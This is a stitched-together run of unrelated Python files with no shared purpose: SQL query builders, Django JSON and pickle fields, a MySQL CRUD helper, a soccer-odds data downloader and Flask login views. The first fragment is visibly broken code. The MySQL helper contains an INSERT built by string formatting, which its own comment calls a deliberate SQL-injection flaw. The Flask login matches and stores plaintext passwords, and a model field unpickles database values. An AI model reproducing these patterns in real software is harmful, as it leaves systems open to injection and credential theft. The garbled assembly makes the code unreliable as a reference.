        while lucene is not None and lucene != "":
            # find field name, determined by placement of ':'
            colon_index = lucene.find(":")
            field_name = lucene[0:colon_index]

            # trim field name
            lucene = lucene[colon_index+1:].lstrip()

            # parse field value
            whitespace_index = lucene.find(" ")
            if whitespace_index == -1:
                whitespace_index = len(lucene)
            field_value = lucene[0:whitespace_index]

            # trim field value
            lucene = lucene[whitespace_index+1:].lstrip()                    

            print("field - " + field_name)                    
            print("value - " + field_value)                    
            print("sql - " + field_name + " = " + field_value)                    



parser = LuceneParser                    

parser.parse("LuceneParser", "name:   mike profession: engineer")                    
#parser.parse(LuceneParser, "device:'mike'")
#parser.parse(LuceneParser, "-device:'mike'")
#parser.parse(LuceneParser, "gpa:[3.0 TO 4.0]")

from orm_cloud.database_adapters.lucene_parser.lucene_parser import LuceneParser


class MsSqlAdapter:
    def __init__(self):
        pass

    def get_sql(self, select, table, where, sort_by=None, offset=None, limit=None):
        sql = self.create_select(select) + ' '
        sql += self.create_from(table) + ' '
        sql += self.create_where(where)                    
        if sort_by: sql += ' '  + self.create_sort_by(sort_by)
        if offset and limit:
            sql += ' ' + self.create_offset(offset, limit)

        return sql                    

    def create_select(self, fields):
        if fields == '*':
            return 'SELECT *'
        else:
            sql = 'SELECT '

            for field in fields:
                sql += '{} AS {}, '.format(field, fields[field])

            return sql.rstrip(', ')                    

    def create_from(self, table_or_view):
        return 'FROM {}'.format(table_or_view)

    def create_where(self, where):
        sql = 'WHERE '                    

        lucene_parser = LuceneParser()
        where_tuples = lucene_parser.parse(where)                    

        for tuple in where_tuples:                    
            sql += '{} {} {}'.format(tuple[0], tuple[1], tuple[2])                    

        return sql                    

    def create_sort_by(self, sort_by):
        parts = sort_by.split(',')

        sql = 'ORDER BY '
        for part in parts:
            sql += part[1:]

            if part[0] == '-':
                sql += ' DESC, '
            else:
                sql += ' ASC, '

        return sql.rstrip(', ')                    

    def create_limit(self, limit):
        return 'LIMIT {}'.format(limit)

    def create_offset(self, offset, limit):
        return 'OFFSET {} ROWS FETCH NEXT {} ROWS ONLY'.format(offset, limit)

# coding: utf-8
__all__ = []
__version__ = '2019.7.7'                    

default_app_config = 'common.apps.CommonConfig'

# coding: utf-8
import base64
import decimal
import pickle

from django.contrib.postgres.lookups import Unaccent
from django.core.exceptions import ValidationError
from django.db import models
from django.db.models import CharField, Lookup, TextField, Transform, lookups
from django.utils.translation import ugettext_lazy as _

from common.utils import json_decode, json_encode


# V√©rifie que l'on utilise le moteur de bases de donn√©es PostgreSQL
is_postgresql = lambda connection: connection.vendor == 'postgresql'
is_mysql = lambda connection: connection.vendor == 'mysql'
is_sqlite = lambda connection: connection.vendor == 'sqlite'


class CustomDecimalField(models.DecimalField):
    """
    Champ d√©cimal sp√©cifique pour √©viter la repr√©sentation scientifique
    """

    def value_from_object(self, obj):
        value = super().value_from_object(obj)
        if isinstance(value, decimal.Decimal):
            return self._transform_decimal(value)
        return value

    def _transform_decimal(self, value):
        context = decimal.Context(prec=self.max_digits)
        return value.quantize(decimal.Decimal(1), context=context) \
            if value == value.to_integral() else value.normalize(context)


class PickleField(models.BinaryField):
    """
    Champ binaire utilisant pickle pour s√©rialiser des donn√©es diverses
    """

    def __init__(self, *args, **kwargs):
        default = kwargs.get('default', None)
        if default is not None:
            kwargs['default'] = pickle.dumps(default)
        super().__init__(*args, **kwargs)

    def from_db_value(self, value, *args, **kwargs):
        return self.to_python(value)

    def to_python(self, value):
        if not value:
            return None
        _value = value
        if isinstance(_value, str):
            _value = bytes(_value, encoding='utf-8')
            try:
                _value = base64.b64decode(_value)
            except Exception:
                pass
        try:
            return pickle.loads(_value)
        except Exception:
            return super().to_python(value)

    def get_prep_value(self, value):
        if not value:
            return None if self.null else b''
        if isinstance(value, bytes):
            return value
        return pickle.dumps(value)

    def value_from_object(self, obj):
        value = super().value_from_object(obj)
        return self.to_python(value)

    def value_to_string(self, obj):
        value = self.value_from_object(obj)
        return base64.b64encode(self.get_prep_value(value))


class JsonDict(dict):
    """
    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!
    """

    def __repr__(self):
        return json_encode(self, sort_keys=True)

    @property
    def base(self):
        return dict(self)


class JsonString(str):
    """
    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!
    """

    def __repr__(self):
        return json_encode(self, sort_keys=True)

    @property
    def base(self):
        return str(self)


class JsonList(list):
    """
    Hack so repr() called by dumpdata will output JSON instead of Python formatted data. This way fixtures will work!
    """

    def __repr__(self):
        return json_encode(self, sort_keys=True)

    @property
    def base(self):
        return list(self)


class JsonField(models.Field):
    """
    JsonField is a generic TextField that neatly serializes/unserializes JSON objects seamlessly.
    """
    empty_strings_allowed = False
    description = _("A JSON object")
    default_error_messages = {
        'invalid': _("Value must be a valid JSON")
    }
    _default_hint = ('dict', '{}')

    def __init__(self, *args, **kwargs):
        null = kwargs.get('null', False)
        default = kwargs.get('default', None)
        self.encoder = kwargs.get('encoder', None)
        if not null and default is None:
            kwargs['default'] = '{}'
        if isinstance(default, (list, dict)):
            kwargs['default'] = json_encode(default, cls=self.encoder, sort_keys=True)
        models.Field.__init__(self, *args, **kwargs)

    def db_type(self, connection):
        if is_postgresql(connection):
            return 'jsonb'
        return super().db_type(connection)

    def get_internal_type(self):
        return 'TextField'

    def deconstruct(self):
        name, path, args, kwargs = super().deconstruct()
        if self.default == '{}':
            del kwargs['default']
        if self.encoder is not None:
            kwargs['encoder'] = self.encoder
        return name, path, args, kwargs

    def get_transform(self, name):
        transform = super().get_transform(name)
        if transform:
            return transform
        return JsonKeyTransformFactory(name)

    def from_db_value(self, value, *args, **kwargs):
        return self.to_python(value)

    def to_python(self, value):
        """
        Convert our string value to JSON after we load it from the DB
        """
        if value is None or value == '':
            return {} if not self.null else None
        try:
            while isinstance(value, str):
                value = json_decode(value)
        except ValueError:
            pass
        if isinstance(value, dict):
            return JsonDict(**value)
        elif isinstance(value, str):
            return JsonString(value)
        elif isinstance(value, list):
            return JsonList(value)
        return value

    def get_db_prep_value(self, value, connection, prepared=False):
        """
        Convert our JSON object to a string before we save
        """
        if value is None and self.null:
            return None
        # default values come in as strings; only non-strings should be run through `dumps`
        try:
            while isinstance(value, str):
                value = json_decode(value)
        except ValueError:
            pass
        return json_encode(value, cls=self.encoder, sort_keys=True)

    def validate(self, value, model_instance):
        super().validate(value, model_instance)
        try:
            json_encode(value, cls=self.encoder)
        except TypeError:
            raise ValidationError(
                self.error_messages['invalid'],
                code='invalid',
                params={'value': value},
            )

    def value_from_object(self, obj):
        value = super().value_from_object(obj)
        return self.to_python(value)

    def value_to_string(self, obj):
        value = self.value_from_object(obj)
        return value or ''

    def formfield(self, **kwargs):
        from common.forms import JsonField
        defaults = {'form_class': JsonField}
        defaults.update(kwargs)
        return super().formfield(**defaults)


# Mommy monkey-patch for CustomDecimalField
try:
    from django.contrib.postgres.fields import JSONField
    from model_mommy.generators import default_mapping
    default_mapping[CustomDecimalField] = default_mapping.get(models.DecimalField)
    default_mapping[JsonField] = default_mapping.get(JSONField)
except ImportError:
    pass


class JsonKeyTransform(Transform):
    """
    Transformation g√©n√©rale pour JsonField
    """
    operator = '->'
    nested_operator = '#>'

    def __init__(self, key_name, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.key_name = key_name

    def as_sql(self, compiler, connection, **kwargs):
        key_transforms = [self.key_name]
        previous = self.lhs
        while isinstance(previous, JsonKeyTransform):
            key_transforms.insert(0, previous.key_name)
            previous = previous.lhs
        lhs, params = compiler.compile(previous)
        if len(key_transforms) > 1:
            return "(%s %s %%s)" % (lhs, self.nested_operator), [key_transforms] + params                    
        try:
            int(self.key_name)                    
        except ValueError:
            lookup = "'%s'" % self.key_name                    
        else:
            lookup = "%s" % self.key_name                    
        return "(%s %s %s)" % (lhs, self.operator, lookup), params                    


class JsonKeyTextTransform(JsonKeyTransform):
    """
    Transformation pour JsonField afin d'utiliser les lookups sur les √©l√©ments texte
    """
    operator = '->>'
    nested_operator = '#>>'
    _output_field = TextField()


class JsonKeyTransformTextLookupMixin(object):
    def __init__(self, key_transform, *args, **kwargs):
        assert isinstance(key_transform, JsonKeyTransform)
        key_text_transform = JsonKeyTextTransform(
            key_transform.key_name, *key_transform.source_expressions, **key_transform.extra)
        super(JsonKeyTransformTextLookupMixin, self).__init__(key_text_transform, *args, **kwargs)


@JsonKeyTransform.register_lookup
class JsonKeyTransformIExact(JsonKeyTransformTextLookupMixin, lookups.IExact):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformContains(JsonKeyTransformTextLookupMixin, lookups.Contains):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformIContains(JsonKeyTransformTextLookupMixin, lookups.IContains):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformStartsWith(JsonKeyTransformTextLookupMixin, lookups.StartsWith):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformIStartsWith(JsonKeyTransformTextLookupMixin, lookups.IStartsWith):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformEndsWith(JsonKeyTransformTextLookupMixin, lookups.EndsWith):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformIEndsWith(JsonKeyTransformTextLookupMixin, lookups.IEndsWith):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformRegex(JsonKeyTransformTextLookupMixin, lookups.Regex):
    pass


@JsonKeyTransform.register_lookup
class JsonKeyTransformIRegex(JsonKeyTransformTextLookupMixin, lookups.IRegex):
    pass


class JsonKeyTransformFactory(object):

    def __init__(self, key_name):
        self.key_name = key_name

    def __call__(self, *args, **kwargs):
        return JsonKeyTransform(self.key_name, *args, **kwargs)


@JsonField.register_lookup
class JsonHas(Lookup):
    """
    Recherche un √©l√©ment dans un champ JSON contenant un tableau de cha√Ænes de caract√®res ou un dictionnaire
    Uniquement pour PostgreSQL
    """
    lookup_name = 'has'

    def as_sql(self, compiler, connection):
        if is_postgresql(connection):
            lhs, lhs_params = self.process_lhs(compiler, connection)
            rhs, rhs_params = self.process_rhs(compiler, connection)
            assert len(rhs_params) == 1, _("A string must be provided as argument")
            # assert all(isinstance(e, str) for e in rhs_params), _("Argument must be of type string")
            params = lhs_params + rhs_params
            return '%s ? %s' % (lhs, rhs), params
        raise NotImplementedError(
            _("The lookup '{lookup}' is only supported in PostgreSQL").format(
                lookup=self.lookup_name))


class JsonArrayLookup(Lookup):
    """
    Lookup standard pour la recherche multiple dans des tableaux de cha√Ænes de caract√®res
    Uniquement pour PostgreSQL
    """

    def as_sql(self, compiler, connection):
        if is_postgresql(connection):
            lhs, lhs_params = self.process_lhs(compiler, connection)
            rhs, rhs_params = self.process_rhs(compiler, connection)
            assert len(rhs_params) == 1, _("A list of strings must be provided as argument")
            value, *junk = rhs_params
            rhs = ','.join(['%s'] * len(value))
            # assert isinstance(value, list), _("Lookup argument must be a list of strings")
            return '%s %s array[%s]' % (lhs, self.lookup_operator, rhs), value
        raise NotImplementedError(
            _("The lookup '{lookup}' is only supported in PostgreSQL").format(
                lookup=self.lookup_name))


@JsonField.register_lookup
class JsonInAny(JsonArrayLookup):
    """
    Recherche les √©l√©ments dans au moins une valeur est pr√©sente dans la liste fournie en param√®tre
    Uniquement pour PostgreSQL
    """
    lookup_name = 'any'
    lookup_operator = '?|'


@JsonField.register_lookup
class JsonInAll(JsonArrayLookup):
    """
    Recherche les √©l√©ments dans toutes les valeurs sont pr√©sentes dans la liste fournie en param√®tre
    Uniquement pour PostgreSQL
    """
    lookup_name = 'all'
    lookup_operator = '?&'


@JsonField.register_lookup
class JsonOverlap(JsonArrayLookup):
    """
    Recherche les √©l√©ments dans au moins une valeur est pr√©sente dans la liste fournie en param√®tre
    Uniquement pour PostgreSQL
    """
    lookup_name = 'overlap'
    lookup_operator = '&&'


class JsonDictLookup(Lookup):
    """
    Lookup standard pour la recherche multiple dans des dictionnaires
    Uniquement pour PostgreSQL
    """

    def as_sql(self, compiler, connection):
        if is_postgresql(connection):
            lhs, lhs_params = self.process_lhs(compiler, connection)
            rhs, rhs_params = self.process_rhs(compiler, connection)
            assert len(rhs_params) == 1, _("A dictionary must be provided as argument")
            value, *junk = rhs_params
            # assert isinstance(value, dict), _("Lookup argument must be a dictionary")
            return '%s %s %s::jsonb' % (lhs, self.lookup_operator, rhs), [json_encode(value)]
        raise NotImplementedError(
            _("The lookup '{lookup}' is only supported in PostgreSQL").format(
                lookup=self.lookup_name))


@JsonField.register_lookup
class JsonContains(JsonDictLookup):
    """
    Recherche les √©l√©ments qui contiennent le dictionnaire fourni en param√®tre
    Uniquement pour PostgreSQL
    """
    lookup_name = 'hasdict'
    lookup_operator = '@>'


@JsonField.register_lookup
class JsonContained(JsonDictLookup):
    """
    Recherche les √©l√©ments qui sont contenus dans le dictionnaire fourni en param√®tre
    Uniquement pour PostgreSQL
    """
    lookup_name = 'indict'
    lookup_operator = '<@'


@JsonField.register_lookup
class JsonEmpty(Lookup):
    """
    Recherche les √©l√©ments dont la valeur est consid√©r√©e comme vide ou nulle
    Uniquement pour PostgreSQL
    """
    lookup_name = 'isempty'
    empty_values = ['{}', '[]', '', 'null', None]

    def as_sql(self, compiler, connection):
        if is_postgresql(connection):
            lhs, lhs_params = self.process_lhs(compiler, connection)
            rhs, rhs_params = self.process_rhs(compiler, connection)
            assert len(rhs_params) == 1, _("A boolean must be provided as argument")
            value, *junk = rhs_params
            assert isinstance(value, bool), _("Lookup argument must be a boolean")
            rhs = ','.join(['%s'] * len(self.empty_values))
            if value:
                return '%s IS NULL OR %s::text IN (%s)' % (lhs, lhs, rhs), self.empty_values
            return '%s IS NOT NULL AND %s::text NOT IN (%s)' % (lhs, lhs, rhs), self.empty_values
        raise NotImplementedError(
            _("The lookup '{lookup}' is only supported in PostgreSQL").format(
                lookup=self.lookup_name))


@CharField.register_lookup
@TextField.register_lookup
class CustomUnaccent(Unaccent):
    has_unaccent = None
    lookup_name = 'unaccent'

    def as_sql(self, compiler, connection, **kwargs):
        if CustomUnaccent.has_unaccent is None:
            cursor = connection.cursor()
            cursor.execute("SELECT COUNT(proname) FROM pg_proc WHERE proname = 'f_unaccent';")
            response = cursor.fetchone()
            CustomUnaccent.has_unaccent = response and response[0] > 0
        if CustomUnaccent.has_unaccent:
            CustomUnaccent.function = 'F_UNACCENT'
        return super().as_sql(compiler, connection, **kwargs)

from .api import get_query_manager                    

__all__ = ("get_query_manager",)                    


"""
opportunity_qm = models.Opportunity.get_query_manager()                    

opportunities = opportunity_qm.run(                    
    {
        'id': o.Id,
        'accounts': [
            {'id': a.Id}
            for a in o.Accounts                    
        ]
    }
    for o in opportunity_qm                    
)
"""

from typing import Iterator, TypeVar                    

from .interface import ISpy                    

T = TypeVar("T")


def construct_select_statement(spy: ISpy, from_: str) -> str:                    
    return f"""SELECT {', '.join(construct_selects(spy))} FROM {from_}"""                    


def construct_selects(spy: ISpy, current_name: str = "") -> Iterator[str]:
    if spy.is_subquery:
        yield construct_subquery(spy, name=current_name)
    elif not spy.selected_fields:
        yield current_name
    else:
        for field_name, field_spy in spy.selected_fields.items():
            joined_name = f"{current_name}.{field_name}".lstrip(".")
            yield from construct_selects(field_spy, joined_name)


def construct_subquery(spy: ISpy, name: str) -> str:
    select_fields = _flatten(
        construct_selects(field_spy, field_name)
        for field_name, field_spy in spy.selected_fields.items()
    )
    return f"""(SELECT {', '.join(select_fields)} FROM {name})"""                    


def _flatten(iterables: Iterator[Iterator[T]]) -> Iterator[T]:
    for iterable in iterables:
        yield from iterable

from typing import Any, Dict, Iterator, TypeVar                    

from typing_extensions import Protocol

T = TypeVar("T")


class SupportsSubQuery(Protocol):
    def __iter__(self) -> "Iterator[IRow]":
        ...


class SupportsFiltering(Protocol):
    def filter(self, expression: bool) -> bool:                    
        ...


class IRow(SupportsFiltering, SupportsSubQuery, Protocol):
    def __getattr__(self, name: str) -> Any:
        ...


class IQueryManager(Protocol):                    
    def __iter__(self) -> Iterator[IRow]:
        ...


class ISpy(IRow, Protocol):
    selected_fields: "Dict[str, ISpy]"
    is_subquery: bool


class IQueryModel(Protocol):
    name: str


class IQueryClient(Protocol):
    def query(self, query_string: str) -> Iterator[IRow]:
        ...

from typing import Iterator, TypeVar                    

from .construct import construct_select_statement
from .interface import IRow                    
from .spy import Spy

T = TypeVar("T")


class QueryManager:
    def __init__(self, from_object: str, client):
        self.from_object = from_object
        self.client = client

    def run(self, iterator: Iterator[T]) -> Iterator[T]:
        # Currently we don't actually do much here.
        # We need to drop the first element of the iterator, as this is
        # where we used a Spy.
        # While through magical powers at a future time, we could make the Spy
        # actually change its stripes into actual data, it's more effort than it's
        # worth.

        # As we could have a list or generator, we should change to an iterator to have
        # a common interface to work with.
        iterator = iter(iterator)
        next(iterator)  # discards
        return iterator

    def __iter__(self) -> Iterator[IRow]:
        # We need to find out what fields are being requested
        spy = Spy()
        yield spy

        # Now we've collected all access points, turn it into an SOQL statement
        query_string = construct_select_statement(spy, self.from_object)                    
        print(query_string)

        # The client can take over from here, as that is in charge of fetching + building objects.
        yield from self.client.query(query_string)

from collections import defaultdict
from typing import Dict, Iterator, TypeVar                    

from .interface import ISpy                    

T = TypeVar("T", bound=ISpy)


class Spy:
    selected_fields: Dict[str, ISpy]
    is_subquery: bool

    def __init__(self):
        self.selected_fields = defaultdict(self.__class__)                    
        self.is_subquery = False

    def __getattr__(self, name: str) -> ISpy:
        return self.selected_fields[name]

    def __iter__(self: T) -> Iterator[T]:
        self.is_subquery = True
        yield self

import sys
# sys.path.append("/root/.local/lib/python2.7/site-packages")

import pymysql
import pymysql.cursors
import dbconfig

# The four main database operations CRUD - Create. Read. Update. Delete


class DBHelper:

    #   --- CREATE --- Create and Insert New Data

    def connects(self, database="crimemap"):
        try:
            conn = pymysql.connect(host='localhost',
                                   user=dbconfig.db_user,
                                   password=dbconfig.db_password,
                                   db=database,
                                   charset='utf8mb4',
                                   cursorclass=pymysql.cursors.DictCursor)
        except Exception as e:
            print(e)
        return conn
    # --- READ --- Read Exsiting Data

    def get_all_inputs(self):
        connection = self.connects()
        try:
            query = "SELECT description FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
            return cursor.fetchall()
        finally:
            connection.close()

    # --- UPDATE --- Modify Existing Data

    def add_input(self, data):                    
        connection = self.connects()
        try:
            # The following introduces a deliberate security flaw. See section on SQL injecton below
            query = "INSERT INTO crimes (description) VALUES ('{}');".format(                    
                data)                    
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

    # --- DELETE --- Delete Exsising Data

    def clear_all(self):
        connection = self.connects()
        try:
            query = "DELETE FROM crimes;"
            with connection.cursor() as cursor:
                cursor.execute(query)                    
                connection.commit()
        finally:
            connection.close()

#!/usr/bin/env python3

"""
Download and prepare training and fixtures data 
from various leagues.
"""

from os.path import join
from itertools import product
from difflib import SequenceMatcher
from sqlite3 import connect
from argparse import ArgumentParser, RawDescriptionHelpFormatter

from scipy.stats import hmean
import numpy as np
import pandas as pd

from sportsbet import SOCCER_PATH
from sportsbet.soccer import TARGET_TYPES_MAPPING

DB_CONNECTION = connect(join(SOCCER_PATH, 'soccer.db'))
LEAGUES_MAPPING = {
    'E0': 'Barclays Premier League',
    'B1': 'Belgian Jupiler League',
    'N1': 'Dutch Eredivisie',
    'E1': 'English League Championship',
    'E2': 'English League One',
    'E3': 'English League Two',
    'F1': 'French Ligue 1',
    'F2': 'French Ligue 2',
    'D1': 'German Bundesliga',
    'D2': 'German 2. Bundesliga',
    'G1': 'Greek Super League',
    'I1': 'Italy Serie A',
    'I2': 'Italy Serie B',
    'P1': 'Portuguese Liga',
    'SC0': 'Scottish Premiership',
    'SP1': 'Spanish Primera Division',
    'SP2': 'Spanish Segunda Division',
    'T1': 'Turkish Turkcell Super Lig'
}


def combine_odds(odds, target_types):
    """Combine odds of different betting types."""
    combined_odds = 1 / pd.concat([1 / odds[target_type] for target_type in target_types], axis=1).sum(axis=1)
    combined_odds.name = '+'.join(target_types)
    return pd.concat([odds, combined_odds], axis=1)


def check_leagues_ids(leagues_ids):
    """Check correct leagues ids input."""
    
    # Set error message
    leagues_ids_error_msg = 'Parameter `leagues_ids` should be equal to `all` or a list that contains any of %s elements. Got %s instead.' % (', '.join(LEAGUES_MAPPING.keys()), leagues_ids)

    # Check types
    if not isinstance(leagues_ids, (str, list)):
        raise TypeError(leagues_ids_error_msg)
    
    # Check values
    if leagues_ids != 'all' and not set(LEAGUES_MAPPING.keys()).issuperset(leagues_ids):
        raise ValueError(leagues_ids_error_msg)
    
    leagues_ids = list(LEAGUES_MAPPING.keys()) if leagues_ids == 'all' else leagues_ids[:]

    return leagues_ids


def create_spi_tables(leagues_ids):
    """Download spi data and save them to database."""

    # Check leagues ids
    leagues_ids = check_leagues_ids(leagues_ids)

    # Download data
    spi = pd.read_csv('https://projects.fivethirtyeight.com/soccer-api/club/spi_matches.csv').drop(columns=['league_id'])

    # Cast to date
    spi['date'] = pd.to_datetime(spi['date'], format='%Y-%m-%d')

    # Filter leagues
    leagues = [LEAGUES_MAPPING[league_id] for league_id in leagues_ids]
    spi = spi[spi['league'].isin(leagues)]

    # Convert league names to ids
    inverse_leagues_mapping = {league: league_id for league_id, league in LEAGUES_MAPPING.items()}
    spi['league'] = spi['league'].apply(lambda league: inverse_leagues_mapping[league])

    # Filter matches
    mask = (~spi['score1'].isna()) & (~spi['score2'].isna())
    spi_historical, spi_fixtures = spi[mask], spi[~mask]

    # Save tables
    for name, df in zip(['spi_historical', 'spi_fixtures'], [spi_historical, spi_fixtures]):
        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')


def create_fd_tables(leagues_ids):
    """Download fd data and save them to database."""

    # Define parameters
    base_url = 'http://www.football-data.co.uk'
    cols = ['Date', 'Div', 'HomeTeam', 'AwayTeam']
    features_cols = ['BbAvH', 'BbAvA', 'BbAvD', 'BbAv>2.5', 'BbAv<2.5', 'BbAHh' , 'BbAvAHH', 'BbAvAHA']
    odds_cols = ['PSH', 'PSA', 'PSD', 'BbMx>2.5', 'BbMx<2.5', 'BbAHh', 'BbMxAHH', 'BbMxAHA']
    seasons = ['1617', '1718', '1819']

    # Check leagues ids
    leagues_ids = check_leagues_ids(leagues_ids)

    # Download historical data
    fd_historical = []
    for league_id, season in product(leagues_ids, seasons):
        data = pd.read_csv(join(base_url, 'mmz4281', season, league_id), usecols=cols + features_cols + odds_cols)
        data['Date'] = pd.to_datetime(data['Date'], dayfirst=True)
        data['season'] = season
        fd_historical.append(data)
    fd_historical = pd.concat(fd_historical, ignore_index=True)

    # Download fixtures data
    fd_fixtures = pd.read_csv(join(base_url, 'fixtures.csv'), usecols=cols + features_cols + odds_cols)
    fd_fixtures['Date'] = pd.to_datetime(fd_fixtures['Date'], dayfirst=True)
    fd_fixtures = fd_fixtures[fd_fixtures['Div'].isin(leagues_ids)]

    # Save tables
    for name, df in zip(['fd_historical', 'fd_fixtures'], [fd_historical, fd_fixtures]):
        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')


def create_names_mapping_table():
    """Create names mapping table."""

    # Load data
    left_data = pd.read_sql('select date, league, team1, team2 from spi_historical', DB_CONNECTION)
    right_data = pd.read_sql('select Date, Div, HomeTeam, AwayTeam from fd_historical', DB_CONNECTION)

    # Rename columns
    key_columns = ['key0', 'key1']
    left_data.columns = key_columns + ['left_team1', 'left_team2']
    right_data.columns = key_columns + ['right_team1', 'right_team2']

    # Generate teams names combinations
    names_combinations = pd.merge(left_data, right_data, how='outer').dropna().drop(columns=key_columns).reset_index(drop=True)

    # Calculate similarity index
    similarity = names_combinations.apply(lambda row: SequenceMatcher(None, row.left_team1, row.right_team1).ratio() * SequenceMatcher(None, row.left_team2, row.right_team2).ratio(), axis=1)

    # Append similarity index
    names_combinations_similarity = pd.concat([names_combinations, similarity], axis=1)

    # Filter correct matches
    indices = names_combinations_similarity.groupby(['left_team1', 'left_team2'])[0].idxmax().values
    names_matching = names_combinations.take(indices)

    # Teams matching
    matching1 = names_matching.loc[:, ['left_team1', 'right_team1']].rename(columns={'left_team1': 'left_team', 'right_team1': 'right_team'})
    matching2 = names_matching.loc[:, ['left_team2', 'right_team2']].rename(columns={'left_team2': 'left_team', 'right_team2': 'right_team'})
        
    # Combine matching
    matching = matching1.append(matching2)
    matching = matching.groupby(matching.columns.tolist()).size().reset_index()
    indices = matching.groupby('left_team')[0].idxmax().values
        
    # Generate mapping
    names_mapping = matching.take(indices).drop(columns=0).reset_index(drop=True)

    # Save table
    names_mapping.to_sql('names_mapping', DB_CONNECTION, index=False, if_exists='replace')


def create_modeling_tables():
    """Create tables for machine learning modeling."""

    # Define parameters
    spi_keys = ['date', 'league', 'team1', 'team2']
    fd_keys = ['Date', 'Div', 'HomeTeam', 'AwayTeam']
    input_cols = ['spi1', 'spi2', 'prob1', 'prob2', 'probtie', 'proj_score1', 'proj_score2', 'importance1', 'importance2', 'BbAvH', 'BbAvA', 'BbAvD', 'BbAv>2.5', 'BbAv<2.5', 'BbAHh', 'BbAvAHH', 'BbAvAHA']
    output_cols = ['score1', 'score2', 'xg1', 'xg2', 'nsxg1', 'nsxg2', 'adj_score1', 'adj_score2']
    odds_cols_mapping = {'PSH': 'H', 'PSA': 'A', 'PSD': 'D', 'BbMx>2.5': 'over_2.5', 'BbMx<2.5': 'under_2.5', 'BbAHh': 'handicap', 'BbMxAHH': 'handicap_home', 'BbMxAHA': 'handicap_away'}
    
    # Load data
    data = {}
    for name in ('spi_historical', 'spi_fixtures', 'fd_historical', 'fd_fixtures', 'names_mapping'):
        parse_dates = ['date'] if name in ('spi_historical', 'spi_fixtures') else ['Date'] if name in ('fd_historical', 'fd_fixtures') else None
        data[name] = pd.read_sql('select * from %s' % name, DB_CONNECTION, parse_dates=parse_dates)                    

    # Rename teams
    for col in ['team1', 'team2']:
        for name in ('spi_historical', 'spi_fixtures'):
            data[name] = pd.merge(data[name], data['names_mapping'], left_on=col, right_on='left_team', how='left').drop(columns=[col, 'left_team']).rename(columns={'right_team': col})

    # Combine data
    historical = pd.merge(data['spi_historical'], data['fd_historical'], left_on=spi_keys, right_on=fd_keys).dropna(subset=odds_cols_mapping.keys(), how='any').reset_index(drop=True)
    fixtures = pd.merge(data['spi_fixtures'], data['fd_fixtures'], left_on=spi_keys, right_on=fd_keys)

    # Extract training, odds and fixtures
    X = historical.loc[:, ['season'] + spi_keys + input_cols]
    y = historical.loc[:, output_cols]
    odds = historical.loc[:, spi_keys + list(odds_cols_mapping.keys())].rename(columns=odds_cols_mapping)
    X_test = fixtures.loc[:, spi_keys + input_cols]
    odds_test = fixtures.loc[:, spi_keys + list(odds_cols_mapping.keys())].rename(columns=odds_cols_mapping)

    # Add average scores columns
    for ind in (1, 2):
        y['avg_score%s' % ind] =  y[['score%s' % ind, 'xg%s' % ind, 'nsxg%s' % ind]].mean(axis=1)

    # Add combined odds columns
    for target_type in TARGET_TYPES_MAPPING.keys():
        if '+' in target_type:
            target_types = target_type.split('+')
            odds = combine_odds(odds, target_types)
            odds_test = combine_odds(odds_test, target_types)

    # Feature extraction
    with np.errstate(divide='ignore',invalid='ignore'):
        for df in (X, X_test):
            df['quality'] = hmean(df[['spi1', 'spi2']], axis=1)
            df['importance'] = df[['importance1', 'importance2']].mean(axis=1)
            df['rating'] = df[['quality', 'importance']].mean(axis=1)
            df['sum_proj_score'] = df['proj_score1'] + df['proj_score2']

    # Save tables
    for name, df in zip(['X', 'y', 'odds', 'X_test', 'odds_test'], [X, y, odds, X_test, odds_test]):
        df.to_sql(name, DB_CONNECTION, index=False, if_exists='replace')


def download():
    """Command line function to download data and update database."""
    
    # Create parser description
    description = 'Select the leagues parameter from the following leagues:\n\n'
    for league_id, league_name in LEAGUES_MAPPING.items():
        description += '{} ({})\n'.format(league_id, league_name)

    # Create parser
    parser = ArgumentParser(description=description, formatter_class=RawDescriptionHelpFormatter)

    # Add arguments
    parser.add_argument('leagues', nargs='*', default=['all'], help='One of all or any league ids from above.')
    
    # Parse arguments
    args = parser.parse_args()

    # Adjust parameter
    leagues = args.leagues
    if len(leagues) == 1 and leagues[0] == 'all':
        leagues = leagues[0]

    # Create tables
    for ind, func in enumerate([create_spi_tables, create_fd_tables, create_names_mapping_table, create_modeling_tables]):
        func(leagues) if ind in (0, 1) else func()

    



from flask import render_template, request, redirect, url_for
from flask_login import login_user, logout_user

from application import app, db
from application.views import render_form
from application.auth.models import User
from application.auth.forms import LoginForm, RegisterForm

@app.route("/auth/login", methods = ["GET", "POST"])
def auth_login():
    if request.method == "GET":
        return render_login()
    form = LoginForm(request.form)
    if not form.validate():
        return render_loginForm(form)

    user = User.query.filter_by(username=form.username.data, password=form.password.data).first()
    if not user:
        return render_loginInvalid(form)

    login_user(user)
    return redirect(url_for("index"))

@app.route("/auth/logout")
def auth_logout():
    logout_user()
    return redirect(url_for("index"))


@app.route("/auth/register")
def auth_register():
    return render_register()

@app.route("/auth/register/", methods=["POST"])
def auth_user_create():
    form = RegisterForm(request.form)
	
    if not form.validate():
        return render_registerForm(form)

    u = User(form.username.data, form.password.data)    

    db.session().add(u)
    db.session.commit()
    
    login_user(u)
  
    return redirect(url_for("index"))

def render_login():
    return render_loginForm(LoginForm())

def render_loginForm(form):
    return render_form(form, False, url_for("auth_login"), "Login", "", True, "")

def render_loginInvalid(form):
    return render_form(form, True, url_for("auth_login"), "Login", "Invalid username or password.")                    

def render_register():
    return render_registerForm(RegisterForm())

def render_registerForm(form):
    return render_form(form, False, url_for("auth_user_create"), "Register", "", True, "")

from application import app, db
from wtforms import ValidationError
from sqlalchemy.sql import text

def unique(table, subtable = None, subname = None, name="name", message = None):
    if not message:
        message = "Entry with that name already exists."
	
    def _unique(form, field):
